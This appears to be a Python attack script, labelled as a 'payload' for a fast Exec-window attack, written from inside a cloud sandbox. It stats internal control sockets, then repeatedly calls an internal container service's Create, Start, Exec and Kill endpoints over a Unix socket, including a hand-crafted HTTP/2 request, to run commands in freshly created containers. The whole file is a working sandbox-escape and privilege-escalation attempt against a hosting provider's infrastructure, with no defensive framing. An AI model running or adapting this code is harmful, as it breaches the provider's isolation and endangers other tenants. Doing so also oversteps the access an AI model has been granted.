# -*- coding: utf-8 -*-
"""v112 payload: 快速 Exec 窗口攻击 + socket 权限
P0 stat cell.sock 权限
P1 循环 Create->Start->立即Exec (JSON unary, process.args)
P2 H2 + connect+proto 手写 Exec (流式)
P3 容器存活时间测量
输出 /vercel/sandbox/v112c.out"""
import socket, struct, time, signal, json, os

OUT = '/vercel/sandbox/v112c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(220)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body=b'{}', t=2.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        payload = d[hdr_end + 4:hdr_end + 4 + 400] if hdr_end > 0 else b''
        return status, payload
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def h2_frame(t, flags, stream, payload):
    return struct.pack('>I', len(payload))[1:] + bytes([t, flags]) + struct.pack('>I', stream) + payload


def h2_connect_exec(sockpath, path, req_body, t=4.0):
    """HTTP/2 POST + application/connect+proto (unix socket)"""
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        s.sendall(h2_frame(4, 0, 0, b''))
        try:
            s.recv(1024)
            s.sendall(h2_frame(4, 1, 0, b''))
        except Exception:
            pass
        pv = path.encode()
        hp = b'\x83\x86' + b'\x44' + bytes([len(pv)]) + pv + b'\x41\x09localhost'
        hp += b'\x40' + b'\x0ccontent-type' + b'\x16application/connect+proto'
        s.sendall(h2_frame(1, 0x4, 1, hp))
        s.sendall(h2_frame(0, 0x1, 1, req_body))  # DATA END_STREAM
        d2 = b''
        done = False
        try:
            while len(d2) < 65536 and not done:
                c = s.recv(8192)
                if not c:
                    break
                d2 += c
                off = 0
                while off + 9 <= len(d2):
                    ln = int.from_bytes(d2[off:off + 3], 'big')
                    typ = d2[off + 3]
                    fl = d2[off + 4]
                    if typ == 0 and (fl & 1) and ln >= 5:
                        # DATA END_STREAM, 尝试解析 connect 帧
                        pay = d2[off + 9:off + 9 + ln]
                        log('  h2 DATA %dB flags=%d %r' % (ln, fl, pay[:200]))
                    if typ in (2, 7):
                        done = True
                    off += 9 + ln
        except Exception:
            pass
        s.close()
        return d2
    except Exception as e:
        log('h2 EXC %s' % type(e).__name__)
        return b''


CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def ps_snapshot():
    try:
        return set(int(x) for x in os.listdir('/proc') if x.isdigit())
    except Exception:
        return set()


# P0 socket 权限
log('=== P0 socket perm ===')
for p in ('/run/cell/cell.sock', '/run/cell', '/run/containerd/containerd.sock', '/run/metrics/metrics.sock'):
    try:
        st = os.stat(p)
        import stat as stm
        log('%s mode=%o uid=%d gid=%d' % (p, stm.S_IMODE(st.st_mode), st.st_uid, st.st_gid))
    except Exception as e:
        log('%s ERR %s' % (p, type(e).__name__))

# P1 快速 Exec 循环
log('=== P1 quick exec loop ===')
for i in range(3):
    st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=10)
    cid = None
    try:
        cid = json.loads(pay.decode()).get('containerId')
    except Exception:
        pass
    log('round%d cid=%s' % (i, cid))
    if not cid:
        continue
    pids0 = ps_snapshot()
    st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
    # 立即 Exec (不 sleep)
    st2, pay2 = connect_unix(CELL, '%s/Exec' % CTRS,
                             json.dumps({'containerId': cid, 'process': {'args': ['id']}}).encode(), t=4)
    log('round%d EXEC(0ms) -> %s %r' % (i, st2, pay2[:250]))
    # 50ms 后再次 Exec
    time.sleep(0.05)
    st3, pay3 = connect_unix(CELL, '%s/Exec' % CTRS,
                             json.dumps({'containerId': cid, 'process': {'args': ['id']}}).encode(), t=4)
    log('round%d EXEC(50ms) -> %s %r' % (i, st3, pay3[:250]))
    # 新 pid
    newp = sorted(ps_snapshot() - pids0)
    log('round%d new pids: %s' % (i, newp))
    # 清理
    connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
    time.sleep(0.3)

# P2 H2 connect+proto Exec
log('=== P2 h2 connect+proto ===')
st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=10)
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('P2 cid=%s' % cid)
if cid:
    st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
    # proto: field1 container_id, field2 process{field1 args[]}
    req = b'\x0a' + bytes([len(cid)]) + cid.encode()
    args_payload = b'\x0a\x02id'
    req += b'\x12' + bytes([len(args_payload)]) + args_payload
    d2 = h2_connect_exec(CELL, '%s/Exec' % CTRS, req, t=5)
    log('P2 h2 exec total %dB' % len(d2))
    # 也试 Stdin/StreamOutput h2
    d2 = h2_connect_exec(CELL, '%s/StreamOutput' % CTRS, req, t=3)
    log('P2 h2 streamout total %dB' % len(d2))
    connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)

log('V112C_DONE')
f.close()
